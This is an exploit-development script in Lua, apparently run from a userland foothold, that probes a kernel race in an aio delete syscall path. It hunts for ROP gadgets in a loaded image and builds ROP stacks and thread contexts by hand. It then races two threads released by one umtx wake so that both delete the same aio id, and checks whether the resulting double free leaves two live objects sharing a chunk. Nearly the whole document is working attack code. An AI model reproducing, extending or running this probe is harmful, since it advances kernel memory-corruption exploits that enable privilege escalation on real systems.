-- CRASH_CLASS: RISKY
-- PROBE 723a: do two live aio objects share a chunk after the race?
--
-- Context: the delete branch is on [T+2], the entry's remaining count, which a
-- non-block create sets to 1 (8ad6fe92 movzx r8d,word [rax+2]; 8ad6fea3 cmp
-- r8w,1). Path A (count==1) frees C and then, because [T]==1 for a non-block
-- entry, frees every work item in S, then S, P and T (8ad70026..8ad700d0).
-- [T] is the *create* count, so a create with count=32 allocates 32 work items
-- and path A walks all of them - a long window.
--
-- Two children released by one umtx wake both delete the same id. If the second
-- re-lookup (8ad5a2a0) lands before the first removes the entry, both run path
-- A and the same chunks are freed twice. The health cycle after each round is
-- what would expose that: a duplicated free would hand the same chunk to two
-- live entries.

print("=== PROBE 723a: aio alias after race ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local n = math.min(chunk, limit-off)
        local ok, s = pcall(function() return memory.read_buffer(base+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local pos = string.find(s, pat, 1, true)
        if pos then return base+off+pos-1 end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[A] gadgets missing") return end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end
local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local W = mmap(page)

local function spawn(idpage, status, cnt)
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    wq(base,    uint64(pop_rdi)); wq(base+8,  uint64(idpage))
    wq(base+16, uint64(pop_rsi)); wq(base+24, uint64(cnt))
    wq(base+32, uint64(pop_rdx)); wq(base+40, uint64(status))
    wq(base+48, uint64(pop_rax)); wq(base+56, uint64(662))
    wq(base+64, uint64(fn))
    wq(base+72, uint64(pop_rax)); wq(base+80, uint64(431))
    wq(base+88, uint64(fn));      wq(base+96, uint64(jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(W));       wq(ctx+Ctx.RSI, uint64(2))
    wq(ctx+Ctx.RDX, uint64(0));       wq(ctx+Ctx.RAX, uint64(454))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local COUNT = 32
local data = mmap(0x1000)
for i=0,COUNT*0x28-4,4 do wd(data+i, 0x41414141) end
local ROUNDS = 15
local both, alias, bad, esc = 0, 0, 0, 0
local function newobj(cnt)
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(cnt), uint64(1), uint64(o)) end)
    if okc and to_num(rvc) == 0 then return o, rd(o) or 0 end
    return nil, 0
end
local function poll(o)
    local p = mmap(page); wd(p, 0xA5A5A5A5)
    pcall(function() mk(664)(uint64(o), uint64(1), uint64(p)) end)
    return rd(p) or 0
end
local function del(o)
    local d = mmap(page); wd(d, 0xA5A5A5A5)
    pcall(function() mk(662)(uint64(o), uint64(1), uint64(d)) end)
    return rd(d) or 0
end
for r=1,ROUNDS do
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(COUNT), uint64(1), uint64(o)) end)
    if not (okc and to_num(rvc) == 0) then print("    create failed r" .. r) break end
    poll(o)
    wd(W, 0)
    local idpage = mmap(page); wd(idpage, rd(o) or 0)
    local sa = mmap(page); wd(sa, 0xA5A5A5A5)
    local sb = mmap(page); wd(sb, 0xA5A5A5A5)
    spawn(idpage, sa, 1); spawn(idpage, sb, 1)
    sleep_ms(12)
    for i=1,8 do pcall(function() mk(454)(uint64(W), uint64(3), uint64(2), uint64(0), uint64(0)) end) end
    sleep_ms(20)
    local a, b = rd(sa) or 0, rd(sb) or 0
    if a == 0 and b == 0 then both = both + 1
    elseif a ~= 0xA5A5A5A5 and b ~= 0xA5A5A5A5 then esc = esc + 1 end
    -- two live objects at once
    local oa, ida = newobj(1)
    local ob, idb = newobj(1)
    if not (oa and ob) then bad = bad + 1; print("    create pair failed r" .. r)
    else
        local pa, pb = poll(oa), poll(ob)
        local da = del(oa)
        local pb2 = poll(ob)
        local db = del(ob)
        local okrow = (pa == 3 or pa == 0x10003) and (pb == 3 or pb == 0x10003) and da == 0
                       and (pb2 == 3 or pb2 == 0x10003) and db == 0
        if not okrow then
            alias = alias + 1
            print(string.format("    ALIAS r%d ids=%04X/%04X poll=%X/%X del1=%08X pollB2=%X del2=%08X",
                r, ida, idb, pa, pb, da, pb2, db))
        end
    end
    if r % 5 == 0 then
        print(string.format("[B] r%d both=%d alias=%d other=%d bad=%d alive=%d", r, both, alias, esc, bad,
            to_num(native.fcall_with_rax(fn_ud, 20))))
    end
end
print(string.format("[C] both=%d alias=%d other=%d bad=%d alive=%d", both, alias, esc, bad,
    to_num(native.fcall_with_rax(fn_ud, 20))))
